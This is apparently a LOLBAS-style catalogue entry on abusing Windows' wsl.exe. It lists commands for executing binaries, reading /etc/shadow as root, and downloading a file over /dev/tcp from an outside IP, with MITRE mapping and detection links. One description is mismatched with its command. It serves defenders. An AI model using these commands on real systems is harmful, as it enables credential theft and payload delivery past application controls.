---
Name: Wsl.exe
Description: Windows subsystem for Linux executable
Author: 'Matthew Brown'
Created: 2019-06-27
Commands:
  - Command: wsl.exe -e /mnt/c/Windows/System32/calc.exe
    Description: Executes calc.exe from wsl.exe
    Usecase: Performs execution of specified file, can be used to execute arbitrary Linux commands.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10, Windows 19 Server
  - Command: wsl.exe -u root -e cat /etc/shadow
    Description: Cats /etc/shadow file as root
    Usecase: Performs execution of arbitrary Linux commands as root without need for password.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10, Windows 19 Server
  - Command: wsl.exe --exec bash -c 'cat file'
    Description: Cats /etc/shadow file as root
    Usecase: Performs execution of arbitrary Linux commands.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10, Windows 19 Server
  - Command: wsl.exe --system calc.exe
    Description: Execute the command as root
    Usecase: Performs execution of arbitrary Linux commands as root without need for password.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 11
  - Command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
    Description: Downloads file from 192.168.1.10
    Usecase: Download file
    Category: Download
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10, Windows 19 Server
Full_Path:
  - Path: C:\Windows\System32\wsl.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/2a4e6d8ebeb07d294e6d16a083361bd7e53df7b3/rules/windows/process_creation/proc_creation_win_lolbin_susp_wsl.yml
  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
  - IOC: Child process from wsl.exe
Resources:
  - Link: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
  - Link: https://twitter.com/nas_bench/status/1535431474429808642
Acknowledgement:
  - Person: Alex Ionescu
    Handle: '@aionescu'
  - Person: Matt
    Handle: '@NotoriousRebel1'
  - Person: Asif Matadar
    Handle: '@d1r4c'
  - Person: Nasreddine Bencherchali
    Handle: '@nas_bench'
---
